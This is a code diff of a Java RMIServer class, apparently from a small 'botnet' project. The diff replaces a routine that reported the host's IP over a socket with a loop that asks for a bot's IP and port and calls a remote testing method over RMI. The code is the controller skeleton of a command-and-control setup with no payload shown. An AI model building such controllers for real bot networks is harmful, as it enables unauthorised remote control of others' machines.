@@ -5,6 +5,7 @@
  */
 package server;
 
+import SServer_package.SServer;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.IOException;
@@ -28,39 +29,23 @@ import rmi.IBotnet;
 
 public class RMIServer {
     
-    public static String getIP() throws SocketException{
-        Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
-        while( ifaces.hasMoreElements() )
-        {
-          NetworkInterface iface = ifaces.nextElement();
-          Enumeration<InetAddress> addresses = iface.getInetAddresses();
-
-          while( addresses.hasMoreElements() )
-          {
-            InetAddress addr = addresses.nextElement();
-            if( addr instanceof Inet4Address && !addr.isLoopbackAddress() )
-            {
-              return addr.toString();
-            }
-          }
-        }
-        return null;
-    }
-    
     public static void main(String[] args) {
         try {
-            IBotnet botnet = (IBotnet) Naming.lookup("rmi://127.0.0.1:1234/BotnetRMI");
-            Socket socket = new Socket("127.0.0.1", 2345);
-            BufferedWriter writer = new BufferedWriter (new OutputStreamWriter(socket.getOutputStream()));
-            String ip = getIP();
-            if (ip != null){
-                writer.write(ip);
-                writer.write("\n");
-                writer.flush();
+            SServer sserver = new SServer(2345);
+            sserver.start();
+            System.out.println(">>>>>INFO: Socket Server started!!!!!!!!");
+            while (true){
+                Scanner scanner = new Scanner(System.in);
+                System.out.println("Bot IP: ");
+                String ip = scanner.nextLine();
+                System.out.println("Port: ");
+                Integer port = scanner.nextInt();
+                IBotnet botnet = (IBotnet) Naming.lookup("rmi://" + ip + ":" + port.toString() + "/BotnetRMI");
+                botnet.testing();
             }
-            writer.close();
-            socket.close();
-//            botnet.testing();
+            
+//            IBotnet botnet = (IBotnet) Naming.lookup("rmi://127.0.0.1:1234/BotnetRMI");
+            
 //            while(true){
 //                Scanner scanner= new Scanner(System.in);
 //                String cmd = scanner.nextLine();
